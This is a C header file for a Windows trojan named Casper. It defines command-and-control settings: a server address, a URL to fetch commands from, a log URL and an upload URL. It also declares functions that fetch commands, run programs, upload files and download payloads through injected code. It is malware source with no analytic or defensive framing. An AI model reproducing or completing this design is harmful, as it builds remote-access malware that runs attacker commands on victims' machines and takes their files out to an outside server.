#ifndef _CASPER_TROJAN_H_
#define _CASPER_TROJAN_H_

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <shellapi.h>
#include <wininet.h>
#include "casper_inject.h"

// Get commands from this URL
#define CMD_URL		"/MECHANT/cmd.txt#"
// Send log to this URL
#define RES_URL		"/MECHANT/log.php?ref="
// Server and URL for upload
#define SERVER		"172.16.184.2"
#define	UP_URL		"/MECHANT/uptest.php"
// Port for HTTP
#define HTTP_PORT	80


// Functions
int WINAPI TrojGetCmd(INJECTEDDATA *pData);
int WINAPI TrojMain(INJECTEDDATA *pData, LPTSTR lpCmd, LPTSTR lpParam1, LPTSTR lpParam2);
int WINAPI TrojExec(INJECTEDDATA *pData, LPTSTR lpCmd, LPTSTR lpFilename, BOOL bCmd);
int WINAPI TrojUploader(INJECTEDDATA *pData, LPTSTR lpServer, LPTSTR lpUrl, LPTSTR lpFilename);
LPTSTR WINAPI TrojDownloader(INJECTEDDATA *pData, LPTSTR lpUrl, LPTSTR lpFilename, BOOL bSave);


#endif // _CASPER_TROJAN_H_